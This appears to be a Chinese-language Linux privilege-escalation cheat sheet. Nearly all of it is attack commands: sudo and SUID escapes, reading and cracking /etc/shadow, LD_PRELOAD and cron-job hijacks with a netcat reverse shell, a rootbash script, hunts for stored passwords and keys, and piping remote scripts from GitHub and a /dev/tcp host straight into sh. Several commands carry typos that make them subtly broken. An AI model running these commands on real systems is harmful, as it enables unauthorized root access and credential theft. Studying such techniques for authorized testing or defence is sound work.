### 查看当前用户
whoami
id
uname -a
uname -m

### 查看当前目录
pwd

### 枚举
sudo -l

### 切换用户
sudo -u jack /bin/bash
sudo -u#10000 /bin/bash

### 修改交互更好的bash环境
python -c "import pty;pty.spawn('/bin/bash')"

### 搜索
grep -R -i pass /home/* 2>dev/null

### sudo -u提权
sudo -V | grep version 
'Sudo version 1.7.4p4'
sudo -u#-1 /bin/bash

### sudo apt(apt-get)提权
sudo apt update -o APT::Update::Pre-Invoke::=/bin/bash

### sudo apache2提权
sudo apache2 -f /etc/shadow
vim shadow_root
sudo john shadow_root --wordlist=/usr/share/wordlists/rockyou.txt

### sudo ash提权
sudo ash

### sudo awk提权
sudo awk 'BEGIN {system("/bin/bash)}'

### shadow 可读可写
ls -liah /etc/shadow
cat /etc/passwd
cat etc/shadow
cat /etc/shadow | grep ':\$'
vim hash
cat vim
sudo john  --wordlist=/usr/share/wordlists/rockyou.txt hash

mkpasswd -m sha512 admin
vim /etc/shadow 

### passwd 可读可写
openssl passwd admin
vim etc/passwd

### sudo环境变量提权
'env_reset,env_keep+=LD_PRELOAD'
vim 共享库
编译
sudo LD_PRELOAD=/home/user/共享库 find

### 自动任务提权
cat /etc/crontab

'***** root overwrite.sh'
'***** root /usr/local/bin/compress.sh'

locate overwrite.sh
ls -lish /../../overwrite.sh
cat /../../overwrite.sh

kali@kali:sudo nc -lvnp 4444

vim /../../overwrite.sh
反弹shell
----------------------------
vim overwrite.sh
提权脚本
/tmp/rootbash -p

### suid提权
find / -perm -u=s -type f 2>dev/null

/usr/local/bin/suid-so
usr/local/bin/suid-env
usr/local/bin/suid-env2

searchsploit xxx

### 密码和密钥历史文件提权
history
cat ～/.*history | less
ls -liah
cat .viminfo
cat myvpn.ovpn

ssh

### 备份shadow/passwd
cp /etc/shadow /tmp/shadow.bak
cp /etc/passwd /tmp/passwd.bak

### 查看历史记录
history

### 内核提权
uname -a
'内核版本过低'
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
##### 无curl
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
sudo nc -lvnp 80 < linpeas.sh
cat < /dev/tcp/192.168.204.129/80 | sh

### doas

### mysql提权思路
mysql -u root
show databases;
use mysql
show tables;
select * from user;
describe user;


chomd 600 file

locate password | more
find / -name root_key 2> /dev/null

### 提权脚本
"#! /bin/bash

cp /bin/bash /tmp/rootbash
chomd +xs /tmp/rootbash"

/tmp/rootbash -p

### 提权大全
https://gtfobins.github.io/
